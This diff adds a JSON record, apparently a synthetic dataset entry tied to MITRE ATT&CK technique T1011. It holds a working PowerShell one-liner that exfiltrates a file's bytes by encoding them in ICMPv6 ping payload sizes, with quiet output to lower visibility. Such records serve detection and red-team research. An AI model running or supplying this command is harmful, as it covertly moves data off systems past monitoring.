@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fe80::babe:dead:beef:1%12'; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (300 + $_) -IPv6 -Quiet | Out-Null }",
+  "explanation": "Exfiltrates file bytes by encoding each byte into the ICMPv6 payload size using Test-Connection, leveraging ICMP/IPv6 as an alternative medium consistent with T1011.",
+  "rationale_steps": [
+    "Read the file as raw bytes.",
+    "Offset each byte and set it as the ICMP payload length (-BufferSize).",
+    "Send single ICMPv6 echos to a link-local address, suppressing output to reduce visibility."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-b1a1a499",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
